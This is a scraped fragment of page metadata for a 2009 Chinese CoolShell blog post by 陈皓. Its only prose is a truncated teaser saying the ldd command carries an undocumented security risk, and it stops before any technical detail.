content=\"我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。\n\n首先，我们先来了解一下，我们怎么来使...\"/\u003e\u003cmeta itemprop=\"datePublished\" content=\"2009-10-28T00:15:46+08:00\"/\u003e\u003cmeta itemprop=\"dateModified\" content=\"2009-10-28T11:23:07+08:00\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn/articles/1626.html\"/\u003e\u003cmeta itemprop=\"author\" content=\"陈皓\"/\u003e\u003cmeta itemprop=\"mainEntityOfPage\" content=\"https://coolshell.cn/articles/1626.html\"/\u003e\u003cdiv style=\"display: none;\" itemprop=\"publisher\" itemscope=\"\" itemtype=\"https://schema.org/Organization\"\u003e\u003cmeta itemprop=\"name\" content=\"酷 壳 - CoolShell\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn\"/\u003e\u003cdiv itemprop=\"logo\" itemscope=\"\" itemtype=\"https://schema.org/ImageObject\"\u003e\u003cmeta itemprop=\"url\" content=\"\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv style=\"display: none;\" itemprop=\"aggregateRating\" itemscope=\"\" itemtype=\"https://schema.org/AggregateRating\"\u003e\u003cmeta itemprop=\"bestRating\" content=\"5\"/\u003e\u003cmeta itemprop=\"worstRating\" content=\"1\"/\u003e\u003cmeta itemprop=\"ratingValue\" content=\"3.25\"/\u003e\u003cmeta itemprop=\"ratingCount\" content=\"12\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv id=\"post-ratings-1626-loading\" class=\"post-ratings-loading\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif\" width=\"16\" height=\"16\" class=\"post-ratings-image\"/\u003eLoading...\u003c/div\u003e\n\u003c/div\u003e",
  "Date": "2009-10-28T00:15:46+08:00",
  "Author": "陈皓"
}